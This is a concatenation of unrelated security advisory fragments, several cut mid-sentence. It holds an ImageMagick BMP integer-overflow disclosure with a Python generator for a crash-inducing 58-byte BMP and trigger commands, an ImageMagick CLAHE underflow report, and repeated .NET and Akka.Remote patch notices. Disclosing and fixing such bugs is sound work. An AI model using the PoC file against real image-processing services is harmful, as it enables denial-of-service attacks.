OVERFLOW!\n\n// Line 1121: Uses already-overflowed value\nbytes_per_line = 4*((extent+31)/32);\n\n// Line 1122: Checks the RESULT, not the multiplication\nif (BMPOverflowCheck(bytes_per_line, image->rows) != MagickFalse)\n    ThrowReaderException(CorruptImageError, \"InsufficientImageDataInFile\");\n```\n\n### Why the Patch Fails\n\n**Attack Vector (32-bit system):**\n```\nInput BMP Header:\n  Width: 536,870,912 (0x20000000)\n  Height: 1\n  Bits Per Pixel: 32\n\nCalculation on 32-bit system:\n  extent = 536,870,912 × 32\n         = 17,179,869,184 (0x400000000)\n         \n  32-bit truncation:\n  0x400000000 & 0xFFFFFFFF = 0x00000000  ← Overflow to ZERO!\n  \n  bytes_per_line = 4 × ((0 + 31) / 32)\n                 = 4 × 0\n                 = 0\n  \n  BMPOverflowCheck(0, 1):\n    return (1 != 0) && (0 > 4294967295UL/1)\n    return True && (0 > 4294967295)\n    return True && False\n    return False  ← Does NOT detect overflow!\n```\n\n**The check fails because:**\n1. The overflow happens at Line 1120 (extent calculation)\n2. `extent` becomes 0 due to 32-bit truncation\n3. `bytes_per_line` is calculated as 0 (Line 1121)\n4. `BMPOverflowCheck(0, 1)` returns **False** (no overflow detected)\n5. Code proceeds with corrupted values → ASan crash\n\n---\n\n## PoC(Proof of Concept)\n\n### Minimal 58-byte BMP File\n\n**Hex dump:**\n```\n00000000  42 4d 3a 00 00 00 00 00  00 00 36 00 00 00 28 00  |BM:.......6...(.|\n00000010  00 00 00 00 00 20 01 00  00 00 01 00 20 00 00 00  |..... ...... ...|\n00000020  00 00 00 00 00 00 13 0b  00 00 13 0b 00 00 00 00  |................|\n00000030  00 00 00 00 00 00 00 00  00 00                    |..........|\n```\n\n**Key Fields:**\n- Offset 0x12: Width = `00 00 00 20` = 0x20000000 (536,870,912)\n- Offset 0x16: Height = `01 00 00 00` = 1\n- Offset 0x1C: BPP = `20 00` = 32\n\n### Python Generator\n\n```python\n#!/usr/bin/env python3\nimport struct\n\nwidth = 0x20000000   # 536,870,912\nheight = 1\nbpp = 32\n\n# BMP File Header (14 bytes)\nfile_header = b'BM'\nfile_header += struct.pack('<I', 58)      # File size\nfile_header += struct.pack('<HH', 0, 0)   # Reserved\nfile_header += struct.pack('<I', 54)      # Pixel offset\n\n# DIB Header (40 bytes)\ndib_header = struct.pack('<I', 40)        # Header size\ndib_header += struct.pack('<i', width)    # Width\ndib_header += struct.pack('<i', height)   # Height\ndib_header += struct.pack('<H', 1)        # Planes\ndib_header += struct.pack('<H', bpp)      # BPP\ndib_header += struct.pack('<I', 0)        # Compression\ndib_header += struct.pack('<I', 0)        # Image size\ndib_header += struct.pack('<i', 2835)     # X ppm\ndib_header += struct.pack('<i', 2835)     # Y ppm\ndib_header += struct.pack('<I', 0)        # Colors\ndib_header += struct.pack('<I', 0)        # Important colors\n\npixel_data = b'\\x00\\x00\\x00\\x00'\n\nwith open('overflow.bmp', 'wb') as f:\n    f.write(file_header + dib_header + pixel_data)\n\nprint(f\"Created overflow.bmp (58 bytes)\")\n```\n\n---\n\n## Reproduction Steps\n\n### Environment Setup\n\n```bash\n# Use 32-bit Docker container\ndocker run -it --name test-32bit i386/ubuntu:latest bash\n\n# Install dependencies\napt-get update\napt-get install -y clang build-essential wget tar \\\n    libpng-dev libjpeg-dev libfreetype6-dev libxml2-dev \\\n    zlib1g-dev liblzma-dev libbz2-dev\n\n# Download ImageMagick 7.1.2-5\ncd /tmp\nwget https://github.com/ImageMagick/ImageMagick/archive/refs/tags/7.1.2-5.tar.gz\ntar xzf 7.1.2-5.tar.gz\ncd ImageMagick-7.1.2-5\n```\n\n### Build with AddressSanitizer (32-bit IMPORTANT!)\n\n```bash\n# Configure for 32-bit build (CRITICAL - must be 32-bit!)\n./configure \\\n    --host=i686-pc-linux-gnu \\\n    --disable-dependency-tracking \\\n    --disable-silent-rules \\\n    --disable-shared \\\n    --disable-openmp \\\n    --disable-docs \\\n    --without-x \\\n    --without-perl \\\n    --without-magick-plus-plus \\\n    --without-lqr \\\n    --without-zstd \\\n    --without-tiff \\\n    --with-quantum-depth=8 \\\n    --disable-hdri \\\n    CFLAGS=\"-O1 -g -fno-omit-frame-pointer -fsanitize=address,undefined\" \\\n    CXXFLAGS=\"-O1 -g -fno-omit-frame-pointer -fsanitize=address,undefined\" \\\n    LDFLAGS=\"-fsanitize=address,undefined\"\n\nmake -j$(nproc)\n\n### Trigger the Vulnerability\n\n```bash\n# Set environment to bypass cache.c limits\nexport ASAN_OPTIONS=\"detect_leaks=0:malloc_context_size=20:allocator_may_return_null=1\"\nexport MAGICK_WIDTH_LIMIT=2000000000\nexport MAGICK_HEIGHT_LIMIT=2000000000\nexport MAGICK_AREA_LIMIT=10000000000\n\n# Test with malicious BMP (use Python script above to create it)\n./utilities/magick identify overflow.bmp\n```\n\n---\n\n## AddressSanitizer Output\n\n```\n==56720==AddressSanitizer CHECK failed: ../../../../src/libsanitizer/asan/asan_poisoning.cc:37 \n\"((AddrIsInMem(addr + size - (1ULL << kDefaultShadowScale)))) != (0)\" (0x0, 0x0)\n=================================================================\n==56720==AddressSanitizer CHECK failed: ../../../../src/libsanitizer/asan/asan_descriptions.cc:80 \n\"((0 && \"Address is not in memory and not in shadow?\")) != (0)\" (0x0, 0x0)\n==56720==WARNING: ASan is ignoring requested __asan_handle_no_return: \nstack top: 0x40801000; bottom 0x4372f000; size: 0xfd0d2000 (-49471488)\nFalse positive error reports may follow\nFor details see https://github.com/google/sanitizers/issues/189\n```\n\nIt operates in the following environments.\n\n```\nexport MAGICK_WIDTH_LIMIT=2000000000\nexport MAGICK_HEIGHT_LIMIT=2000000000\nexport MAGICK_AREA_LIMIT=10000000000\n```\n\n## Impact\n\n### Attack Scenario\n\n1. Attacker creates a 58-byte malicious BMP file\n2. Uploads to web service that uses ImageMagick (on 32-bit system)\n3. ImageMagick attempts to process the image\n4. Integer overflow triggers AddressSanitizer crash\n5. Service becomes unavailable (Denial of Service)\n\n**Real-world targets:**\n- Web hosting platforms with image processing\n- CDN services with thumbnail generation\n- Legacy embedded systems\n- IoT devices running 32-bit Linux\n- Docker containers using 32-bit base images\n\n---\n\n## Recommended Fix\n\n### Correct Patch\n\nThe overflow check must happen **before** the multiplication:\n\n```c\n// Add overflow check BEFORE calculating extent\nif (BMPOverflowCheck(image->columns, bmp_info.bits_per_pixel) != MagickFalse)\n    ThrowReaderException(CorruptImageError, \"IntegerOverflowInDimensions\");\n\n// Now safe to calculate\nextent = image->columns * bmp_info.bits_per_pixel;\nbytes_per_line = 4*((extent+31)/32);\n\n// Additional safety check\nif (BMPOverflowCheck(bytes_per_line, image->rows) != MagickFalse)\n    ThrowReaderException(CorruptImageError, \"InsufficientImageDataInFile\");\n```\n\n### Alternative: Use 64-bit Arithmetic\n\n```c\n// Force 64-bit calculation\nuint64_t extent_64 = (uint64_t)image->columns * (uint64_t)bmp_info.bits_per_pixel;\n\nif (extent_64 > UINT32_MAX)\n    ThrowReaderException(CorruptImageError,

Unsigned integer underflow → out-of-bounds pointer arithmetic (OOB): when `tile_info.height == 0`, the expression `tile_info.height - 1` (unsigned) wraps to a very large value; using that value in pointer arithmetic yields a huge offset and OOB memory access (leading to memory corruption, SIGSEGV, or resource exhaustion).\n2. **Division/modulus by zero**: where code performs `... / tile_info.width` or `... % tile_info.height` without re-checking for zero, causing immediate division-by-zero crashes under sanitizers or `abort` at runtime.\n\nBoth behaviors are triggered by the same invalid tile condition (e.g., CLI exact `-clahe 0x0!` or automatic tile derivation `dim >> 3 == 0` for very small images). \n\n---\n\n## Details\n\n### **Unsigned underflow(can lea to OOB)**\n\n- Location: `MagickCore/enhance.c`, around line 609\n- Version tested: 7.1.2-8 (local ASan(undefined). /UBSan build)\n- Vulnerable code\n    \n    enhance.c: 609\n    \n    ```c\n    p += (ptrdiff_t) clahe_info->width * (tile.height - 1);\n    ```\n    \n- Root Cause\n    - If `tile.height == 0`, then `(tile.height - 1)` underflows to `UINT_MAX`.\n    - Multiplication with `clahe_info->width` yields a huge value close to `SIZE_MAX`.\n    - Adding this to `p` causes pointer arithmetic underflow.\n\n### **Division-by-zero**\n\n- File / Location: `MagickCore/enhance.c`, around line 669\n- Version tested: 7.1.2-8 (local ASan(undefined). /UBSan build)\n- vulnerable code\n    \n    enhance.c: 669-673\n    \n    ```c\n     if ((image->columns % tile_info.width) != 0)\n        tile_info.x=(ssize_t) (tile_info.width-(image->columns % tile_info.width));\n      tile_info.y=0;\n      if ((image->rows % tile_info.height) != 0)\n        tile_info.y=(ssize_t) (tile_info.height-(image->rows % tile_info.height));\n    ```\n    \n- Root cause\n    \n    Missing input validation / bounds checks after computing default tile dimensions:\n    \n    If either `tile_info.width` or `tile_info.height` is 0, this triggers a division by zero.

If not, add a parse-time flag so CLAHEImage can know whether `0` is literal or auto.\n\n---\n\n## Credit\n\n### Team Whys \n\n**Bug Hunting Master Program, HSpace/Findthegap**\n\n**Youngmin Kim**

name=\"how-affected\"></a>How do I know if I am affected?\n\nIf you have a runtime with a version listed, or an affected package listed in [affected software](#affected-packages) or [affected packages](#affected-software), you're exposed to the vulnerability.\n\n### <a name=\"how-fix\"></a>How do I fix the issue?\n\n1. To fix the issue please install the latest version of .NET 9.0 or .NET 8.0, as appropriate. If you have installed one or more .NET SDKs through Visual Studio, Visual Studio will prompt you to update Visual Studio, which will also update your .NET  SDKs.\n2. If your application references the vulnerable package, update the package reference to the patched version.\n\n* You can list the versions you have installed by running the `dotnet --info` command. You will see output like the following;\n\n```\n.NET SDK:\n Version:           9.0.100\n Commit:            59db016f11\n Workload version:  9.0.100-manifests.3068a692\n MSBuild version:   17.12.7+5b8665660\n\nRuntime Environment:\n OS Name:     Mac OS X\n OS Version:  15.2\n OS Platform: Darwin\n RID:         osx-arm64\n Base Path:   /usr/local/share/dotnet/sdk/9.0.100/\n\n.NET workloads installed:\nThere are no installed workloads to display.\nConfigured to use loose manifests when installing new manifests.\n\nHost:\n  Version:      9.0.0\n  Architecture: arm64\n  Commit:       9d5a6a9aa4\n\n.NET SDKs installed:\n  9.0.100 [/usr/local/share/dotnet/sdk]\n\n.NET runtimes installed:\n  Microsoft.AspNetCore.App 9.0.0 [/usr/local/share/dotnet/shared/Microsoft.AspNetCore.App]\n  Microsoft.NETCore.App 9.0.0 [/usr/local/share/dotnet/shared/Microsoft.NETCore.App]\n\nOther architectures found:\n  x64   [/usr/local/share/dotnet]\n    registered at [/etc/dotnet/install_location_x64]\n\nEnvironment variables:\n  Not set\n\nglobal.json file:\n  Not found\n\nLearn more:\n  https://aka.ms/dotnet/info\n\nDownload .NET:\n  https://aka.ms/dotnet/download\n```\n\n* If you're using .NET 8.0, you should download and install .NET 8.0.21  Runtime or .NET 8.0.318 SDK (for Visual Studio 2022 v17.10 latest update) from https://dotnet.microsoft.com/download/dotnet-core/8.0.\n* If you're using .NET 9.0, you should download and install .NET 9.0.10  Runtime or .NET 9.0.111 SDK (for Visual Studio 2022 v17.12 latest update) from https://dotnet.microsoft.com/download/dotnet-core/9.0.\n\nOnce you have installed the updated runtime or SDK, restart your apps for the update to take effect.\n\nAdditionally, if you've deployed [self-contained applications](https://docs.microsoft.com/dotnet/core/deploying/#self-contained-deployments-scd) targeting any of the impacted versions, these applications are also vulnerable and must be recompiled and redeployed.\n\n## Other Information\n\n### Reporting Security Issues\n\nIf you have found a potential security issue in .NET 9.0 or .NET 8.0, please email details to secure@microsoft.com. Reports may qualify for the Microsoft .NET Core & .NET 5 Bounty. Details of the Microsoft .NET Bounty Program including terms and conditions are at <https://aka.ms/corebounty>.\n\n### Support\n\nYou can ask questions about this issue on GitHub in the .NET GitHub organization. The main repos are located at https://github.com/dotnet/runtime. The Announcements repo (https://github.com/dotnet/Announcements) will contain this bulletin as an issue and will include a link to a discussion issue.

affected?\n\nIf you have a runtime or SDK with a version listed, or an affected package listed in [affected software](#affected-software) or [affected packages](#affected-packages), you're exposed to the vulnerability.\n\n### How do I fix the issue?\n\n1. To fix the issue please install the latest version of .NET 9.0. If you have installed one or more .NET SDKs through Visual Studio, Visual Studio will prompt you to update Visual Studio, which will also update your .NET SDKs.\n2. If your application references the vulnerable package, update the package reference to the patched version.\n\n* You can list the versions you have installed by running the `dotnet --info` command. You will see output like the following:\n\n```\n.NET SDK:\n Version:           9.0.100\n Commit:            59db016f11\n Workload version:  9.0.100-manifests.3068a692\n MSBuild version:   17.12.7+5b8665660\n\nRuntime Environment:\n OS Name:     Mac OS X\n OS Version:  15.2\n OS Platform: Darwin\n RID:         osx-arm64\n Base Path:   /usr/local/share/dotnet/sdk/9.0.100/\n\n.NET workloads installed:\nThere are no installed workloads to display.\nConfigured to use loose manifests when installing new manifests.\n\nHost:\n  Version:      9.0.0\n  Architecture: arm64\n  Commit:       9d5a6a9aa4\n\n.NET SDKs installed:\n  9.0.100 [/usr/local/share/dotnet/sdk]\n\n.NET runtimes installed:\n  Microsoft.AspNetCore.App 9.0.0 [/usr/local/share/dotnet/shared/Microsoft.AspNetCore.App]\n  Microsoft.NETCore.App 9.0.0 [/usr/local/share/dotnet/shared/Microsoft.NETCore.App]\n\nOther architectures found:\n  x64   [/usr/local/share/dotnet]\n    registered at [/etc/dotnet/install_location_x64]\n\nEnvironment variables:\n  Not set\n\nglobal.json file:\n  Not found\n\nLearn more:\n  https://aka.ms/dotnet/info\n\nDownload .NET:\n  https://aka.ms/dotnet/download\n```\n\n* If you're using .NET 9.0, you should download and install .NET 9.0.3 Runtime or .NET 9.0.103 SDK (for Visual Studio 2022 v17.12 latest Preview) from https://dotnet.microsoft.com/download/dotnet-core/9.0.\n\nOnce you have installed the updated runtime or SDK, restart your apps for the update to take effect.\n\nAdditionally, if you've deployed [self-contained applications](https://docs.microsoft.com/dotnet/core/deploying/#self-contained-deployments-scd) targeting any of the impacted versions, these applications are also vulnerable and must be recompiled and redeployed.\n\n## Other Information\n\n### Reporting Security Issues\n\nIf you have found a potential security issue in .NET 8.0 or .NET 9.0, please email details to secure@microsoft.com. Reports may qualify for the Microsoft .NET Core & .NET 5 Bounty. Details of the Microsoft .NET Bounty Program including terms and conditions are at https://aka.ms/corebounty.\n\n### Support\n\nYou can ask questions about this issue on GitHub in the .NET GitHub organization.

<a name=\"how-affected\"></a>How do I know if I am affected?\n\nIf you have a runtime or SDK with a version listed, or an affected package listed in [affected software](#affected-packages) or [affected packages](#affected-software), you're exposed to the vulnerability.\n\n### <a name=\"how-fix\"></a>How do I fix the issue?\n\n1. To fix the issue please install the latest version of .NET 9.0 and .NET 8.0. If you have installed one or more .NET SDKs through Visual Studio, Visual Studio will prompt you to update Visual Studio, which will also update your .NET  SDKs.\n2. If your application references the vulnerable package, update the package reference to the patched version.\n\n* You can list the versions you have installed by running the `dotnet --info` command. You will see output like the following;\n\n```\n.NET SDK:\n Version:           9.0.100\n Commit:            59db016f11\n Workload version:  9.0.100-manifests.3068a692\n MSBuild version:   17.12.7+5b8665660\n\nRuntime Environment:\n OS Name:     Mac OS X\n OS Version:  15.2\n OS Platform: Darwin\n RID:         osx-arm64\n Base Path:   /usr/local/share/dotnet/sdk/9.0.100/\n\n.NET workloads installed:\nThere are no installed workloads to display.\nConfigured to use loose manifests when installing new manifests.\n\nHost:\n  Version:      9.0.0\n  Architecture: arm64\n  Commit:       9d5a6a9aa4\n\n.NET SDKs installed:\n  9.0.100 [/usr/local/share/dotnet/sdk]\n\n.NET runtimes installed:\n  Microsoft.AspNetCore.App 9.0.0 [/usr/local/share/dotnet/shared/Microsoft.AspNetCore.App]\n  Microsoft.NETCore.App 9.0.0 [/usr/local/share/dotnet/shared/Microsoft.NETCore.App]\n\nOther architectures found:\n  x64   [/usr/local/share/dotnet]\n    registered at [/etc/dotnet/install_location_x64]\n\nEnvironment variables:\n  Not set\n\nglobal.json file:\n  Not found\n\nLearn more:\n  https://aka.ms/dotnet/info\n\nDownload .NET:\n  https://aka.ms/dotnet/download\n```\n\n* If you're using .NET 8.0, you should download and install .NET 8.0.21  Runtime or .NET 8.0.318 SDK (for Visual Studio 2022 v17.10 latest update) from https://dotnet.microsoft.com/download/dotnet-core/8.0.\n* If you're using .NET 9.0, you should download and install .NET 9.0.10  Runtime or .NET 9.0.111 SDK (for Visual Studio 2022 v17.12 latest update) from https://dotnet.microsoft.com/download/dotnet-core/9.0.\n* If you're using .NET 10.0, you should download and install .NET 10.0.0-rc.2.25476.107 Runtime or .NET 10.0.100-rc.2.25476.107 SDK (for Visual Studio 2022 v17.12 latest update) from https://dotnet.microsoft.com/download/dotnet-core/10.0.\n* If you're using [Microsoft.AspNetCore.Server.Kestrel.Core](https://www.nuget.org/packages/Microsoft.AspNetCore.Server.Kestrel.Core) nuget package, update to the latest version 2.3.6 using either of the following methods:\n\n    * Using the NuGet Package Manager UI in Visual Studio:\n            - Open your project in Visual Studio.\n            - Right-click on your project in Solution Explorer and select \"Manage NuGet Packages...\" or navigate to \"Project > Manage NuGet Packages\".\n            - In the NuGet Package Manager window, select the \"Updates\" tab. This tab lists packages with available updates from your configured package sources.\n            - Select the package(s) you wish to update. You can choose a specific version from the dropdown or update to the latest available version.\n            - Click the \"Update\" button.\n\n    * Using the NuGet Package Manager Console in Visual Studio:\n            - Open your project in Visual Studio.\n            - Navigate to \"Tools > NuGet Package Manager > Package Manager Console\".\n            - To update a specific package to its latest version, use the Update-Package command:\n                Code:\n\n                Update-Package -Id Microsoft.AspNetCore.Server.Kestrel.Core\n\n    * Using the .NET CLI (Command Line Interface):\n            Open a terminal or command prompt in your project's directory.\n            To update a specific package to its latest version:\n                Code:\n\n                dotnet add package Microsoft.AspNetCore.Server.Kestrel.Core\n\nOnce you have installed the updated runtime or SDK, restart your apps for the update to take effect.\n\nAdditionally, if you've deployed [self-contained applications](https://docs.microsoft.com/dotnet/core/deploying/#self-contained-deployments-scd) targeting any of the impacted versions, these applications are also vulnerable and must be recompiled and redeployed.\n\n## Other Information\n\n### Reporting Security Issues\n\nIf you have found a potential security issue in .NET 8.0, .NET 9.0 or .NET 10.0, please email details to secure@microsoft.com.

TLS did not properly implement certificate-based authentication","details":"### Impact\n\nThis is a critical network security vulnerability for Akka.Remote **users who have SSL / TLS enabled** on their Akka.Remote connections and were expecting certificate-based authentication to be enforced on all peers attempting to join the network.\n\nIn all versions of Akka.Remote from v1.2.0 to v1.5.51, TLS could be enabled via our `akka.remote.dot-netty.tcp` transport and this would correctly enforce private key validation on the server-side of inbound connections. Akka.Remote, however, never asked the outbound-connecting client to present ITS certificate - therefore it's possible for untrusted parties to connect to a private key'd Akka.NET cluster and begin communicating with it **without any certificate**. \n\nThe issue here is that for certificate-based authentication to work properly, ensuring that all members of the Akka.Remote network are secured with the same private key, Akka.Remote needed to implement mutual TLS. This was not the case before Akka.NET v1.5.52.\n\nIf you are running Akka.NET inside a private network you fully control or you were never using TLS in the first place, then this bug has no impact on you. However: if you are using TLS to secure your network YOU MUST upgrade to Akka.NET V1.5.52 or later.\n\n### Patches\n\nhttps://github.com/akkadotnet/akka.net/pull/7847 - forces \"fail fast\" semantics if TLS is enabled but the private key is missing or invalid. Previous versions would only check that once connection attempts occurred.\nhttps://github.com/akkadotnet/akka.net/pull/7851 - **critical fix**: enforces mutual TLS (mTLS) by default, so both parties must be keyed using the same certificate. This fulfills the original security \n\nThese updates have been shipped into Akka.NET v1.5.52: https://github.com/akkadotnet/akka.net/releases/tag/1.5.52\n\n### Workarounds\n\nIf your application isn't exposed publicly, then CVE-2025-61778 has no practical impact on your application. That being said: upgrading to Akka.NET v1.5.52 or later is a good idea.\n\n### References\n\nPlease view our latest network security documentation here:

name=\"how-affected\"></a>How do I know if I am affected?\n\nIf you have a runtime or SDK with a version listed, or an affected package listed in [affected software](#affected-software), you're exposed to the vulnerability.\n\n### <a name=\"how-fix\"></a>How do I fix the issue?\n\n* To fix the issue please install the latest version of .NET 8.0 or .NET 7.0 or .NET 6.0. If you have installed one or more .NET SDKs through Visual Studio, Visual Studio will prompt you to update Visual Studio, which will also update your .NET  SDKs.\n* If you have .NET 6.0 or greater installed, you can list the versions you have installed by running the `dotnet --info` command. You will see output like the following;\n\n```\n.NET Core SDK (reflecting any global.json):\n\n Version:   8.0.200\n Commit:    8473146e7d\n\nRuntime Environment:\n\n OS Name:     Windows\n OS Version:  10.0.18363\n OS Platform: Windows\n RID:         win10-x64\n Base Path:   C:\\Program Files\\dotnet\\sdk\\6.0.300\\\n\nHost (useful for support):\n\n  Version: 8.0.3\n  Commit:  8473146e7d\n\n.NET Core SDKs installed:\n\n  8.0.200 [C:\\Program Files\\dotnet\\sdk]\n\n.NET Core runtimes installed:\n\n  Microsoft.AspNetCore.App 8.0.3 [C:\\Program Files\\dotnet\\shared\\Microsoft.AspNetCore.App]\n  Microsoft.NETCore.App 8.0.3 [C:\\Program Files\\dotnet\\shared\\Microsoft.NETCore.App]\n  Microsoft.WindowsDesktop.App 8.0.3 [C:\\Program Files\\dotnet\\shared\\Microsoft.WindowsDesktop.App]\n\nTo install additional .NET Core runtimes or SDKs:\n  https://aka.ms/dotnet-download\n```\n\n* If you're using .NET 8.0, you should download and install .NET 8.0.3  Runtime or .NET 8.0.202 SDK (for Visual Studio 2022 v17.8) from https://dotnet.microsoft.com/download/dotnet-core/8.0.\n* If you're using .NET 7.0, you should download and install Runtime 7.0.17 or SDK 7.0.117 (for Visual Studio 2022 v17.4) from https://dotnet.microsoft.com/download/dotnet-core/7.0.\n\n.NET 7.0 and, .NET 8.0 updates are also available from Microsoft Update. To access this either type \"Check for updates\" in your Windows search, or open Settings, choose Update & Security and then click Check for Updates.\n\nOnce you have installed the updated runtime or SDK, restart your apps for the update to take effect.\n\nAdditionally, if you've deployed [self-contained applications](https://docs.microsoft.com/dotnet/core/deploying/#self-contained-deployments-scd) targeting any of the impacted versions, these applications are also vulnerable and must be recompiled and redeployed.\n\n## Other Information\n\n### Reporting Security Issues\n\nIf you have found a potential security issue in .NET 8.0 or .NET 7.0 or .NET 6.0, please email details to secure@microsoft.com. Reports may qualify for the Microsoft .NET Core & .NET 5 Bounty. Details of the Microsoft .NET Bounty Program including terms and conditions are at <https://aka.ms/corebounty>.\n\n### Support\n\nYou can ask questions about this issue on GitHub in the .NET GitHub organization.

Client Security Feature Bypass Vulnerability ","details":"### Description\nMicrosoft is releasing this security advisory to provide information about a vulnerability in .NET 6.0, .NET 7.0 and .NET 8.0. This advisory also provides guidance on what developers can do to update their applications to address this vulnerability. \n\nA security feature bypass vulnerability exists when Microsoft .NET Framework-based applications use X.509 chain building APIs but do not completely validate the X.509 certificate due to a logic flaw. An attacker could present an arbitrary untrusted certificate with malformed signatures, triggering a bug in the framework. The framework will correctly report that X.509 chain building failed, but it will return an incorrect reason code for the failure. Applications which utilize this reason code to make their own chain building trust decisions may inadvertently treat this scenario as a successful chain build. This could allow an adversary to subvert the app's typical authentication logic. \n\n### Affected software\n#### NuGet & NuGet Packages\n- Any NuGet.exe, NuGet.CommandLine, NuGet.Packaging 6.8.0 version or earlier. \n- Any NuGet.exe, NuGet.CommandLine, NuGet.Packaging 6.7.0 version or earlier. \n- Any NuGet.exe, NuGet.CommandLine, NuGet.Packaging 6.6.1 version or earlier. \n- Any NuGet.exe, NuGet.CommandLine, NuGet.Packaging 6.4.2 version or earlier. \n- Any NuGet.exe, NuGet.CommandLine, NuGet.Packaging 6.3.3 version or earlier. \n- Any NuGet.exe, NuGet.CommandLine, NuGet.Packaging 6.0.5 version or earlier. \n- Any NuGet.exe, NuGet.CommandLine, NuGet.Packaging 5.11.5 version or earlier. \n\n#### .NET SDK(s)\n- Any .NET SDK 6.0.126 or earlier, or 6.0.418 or earlier.\n- Any .NET SDK 7.0.115 or earlier, or 7.0.312 or earlier, or 7.0.405 or earlier.\n- Any .NET SDK 8.0.101 or earlier.\n \n### Patches\nTo fix the issue, please install the latest version of .NET 6.0, .NET 7.0 or .NET 8.0 and NuGet (NuGet.exe, NuGet.CommandLine, NuGet.

To fix the issue please install the latest version of .NET 9.0 or .NET 8.0, as appropriate. If you have installed one or more .NET SDKs through Visual Studio, Visual Studio will prompt you to update Visual Studio, which will also update your .NET  SDKs.\n2. If your application references the vulnerable package, update the package reference to the patched version.\n\n* You can list the versions you have installed by running the `dotnet --info` command. You will see output like the following;\n\n```\n.NET SDK:\n Version:           9.0.100\n Commit:            59db016f11\n Workload version:  9.0.100-manifests.3068a692\n MSBuild version:   17.12.7+5b8665660\n\nRuntime Environment:\n OS Name:     Mac OS X\n OS Version:  15.2\n OS Platform: Darwin\n RID:         osx-arm64\n Base Path:   /usr/local/share/dotnet/sdk/9.0.100/\n\n.NET workloads installed:\nThere are no installed workloads to display.\nConfigured to use loose manifests when installing new manifests.\n\nHost:\n  Version:      9.0.0\n  Architecture: arm64\n  Commit:       9d5a6a9aa4\n\n.NET SDKs installed:\n  9.0.100 [/usr/local/share/dotnet/sdk]\n\n.NET runtimes installed:\n  Microsoft.AspNetCore.App 9.0.0 [/usr/local/share/dotnet/shared/Microsoft.AspNetCore.App]\n  Microsoft.NETCore.App 9.0.0 [/usr/local/share/dotnet/shared/Microsoft.NETCore.App]\n\nOther architectures found:\n  x64   [/usr/local/share/dotnet]\n    registered at [/etc/dotnet/install_location_x64]\n\nEnvironment variables:\n  Not set\n\nglobal.json file:\n  Not found\n\nLearn more:\n  https://aka.ms/dotnet/info\n\nDownload .NET:\n  https://aka.ms/dotnet/download\n```\n\n* If you're using .NET 8.0, you should download and install .NET 8.0.17  Runtime or .NET 8.0.314 SDK (for Visual Studio 2022 v17.10 latest Preview) from https://dotnet.microsoft.com/download/dotnet-core/8.0.\n* If you're using .NET 9.0, you should download and install .NET 9.0.6  Runtime or .NET 9.0.107 SDK (for Visual Studio 2022 v17.12 latest Preview) from https://dotnet.microsoft.com/download/dotnet-core/9.0.\n\nOnce you have installed the updated runtime or SDK, restart your apps for the update to take effect.\n\nAdditionally, if you've deployed [self-contained applications](https://docs.microsoft.com/dotnet/core/deploying/#self-contained-deployments-scd) targeting any of the impacted versions, these applications are also vulnerable and must be recompiled and redeployed.\n\n## Other Information\n\n### Reporting Security Issues\n\nIf you have found a potential security issue in .NET 9.0 or .NET 8.0, please email details to secure@microsoft.com. Reports may qualify for the Microsoft .NET Core & .NET 5 Bounty. Details of the Microsoft .NET Bounty Program including terms and conditions are at <https://aka.ms/corebounty>.\n\n### Support\n\nYou can ask questions about this issue on GitHub in the .NET GitHub organization.

name=\"how-affected\"></a>How do I know if I am affected?\n\nIf you have a runtime or SDK with a version listed, or an affected package listed in [affected software](#affected-packages) or [affected packages](#affected-software), you're exposed to the vulnerability.\n\n### <a name=\"how-fix\"></a>How do I fix the issue?\n\n* To fix the issue please install the latest version of .NET 8.0 or .NET 7.0 or .NET 6.0. If you have installed one or more .NET SDKs through Visual Studio, Visual Studio will prompt you to update Visual Studio, which will also update your .NET  SDKs.\n* If you have .NET 6.0 or greater installed, you can list the versions you have installed by running the `dotnet --info` command. You will see output like the following;\n\n```\n.NET Core SDK (reflecting any global.json):\n\n\n Version:   8.0.200\n Commit:    8473146e7d\n\nRuntime Environment:\n\n OS Name:     Windows\n OS Version:  10.0.18363\n OS Platform: Windows\n RID:         win10-x64\n Base Path:   C:\\Program Files\\dotnet\\sdk\\6.0.300\\\n\nHost (useful for support):\n\n  Version: 8.0.3\n  Commit:  8473146e7d\n\n.NET Core SDKs installed:\n\n  8.0.200 [C:\\Program Files\\dotnet\\sdk]\n\n.NET Core runtimes installed:\n\n  Microsoft.AspNetCore.App 8.0.3 [C:\\Program Files\\dotnet\\shared\\Microsoft.AspNetCore.App]\n  Microsoft.NETCore.App 8.0.3 [C:\\Program Files\\dotnet\\shared\\Microsoft.NETCore.App]\n  Microsoft.WindowsDesktop.App 8.0.3 [C:\\Program Files\\dotnet\\shared\\Microsoft.WindowsDesktop.App]\n\n\nTo install additional .NET Core runtimes or SDKs:\n  https://aka.ms/dotnet-download\n```\n\n* If you're using .NET 8.0, you should download and install .NET 8.0.5  Runtime or .NET 8.0.105 SDK (for Visual Studio 2022 v17.8) from https://dotnet.microsoft.com/download/dotnet-core/8.0.\n* If you're using .NET 7.0, you should download and install Runtime 7.0.19 or SDK 7.0.119 (for Visual Studio 2022 v17.4) from https://dotnet.microsoft.com/download/dotnet-core/7.0.\n\n.NET 7.0 and, .NET 8.0 updates are also available from Microsoft Update. To access this either type \"Check for updates\" in your Windows search, or open Settings, choose Update & Security and then click Check for Updates.\n\nOnce you have installed the updated runtime or SDK, restart your apps for the update to take effect.\n\nAdditionally, if you've deployed [self-contained applications](https://docs.microsoft.com/dotnet/core/deploying/#self-contained-deployments-scd) targeting any of the impacted versions, these applications are also vulnerable and must be recompiled and redeployed.\n\n## Other Information\n\n### Reporting Security Issues\n\nIf you have found a potential security issue in .NET 8.0 or .NET 7.0 or .NET 6.0, please email details to secure@microsoft.com. Reports may qualify for the Microsoft .NET Core & .NET 5 Bounty. Details of the Microsoft .NET Bounty Program including terms and conditions are at <https://aka.ms/corebounty>.\n\n### Support\n\nYou can ask questions about this issue on GitHub in the .NET GitHub organization.

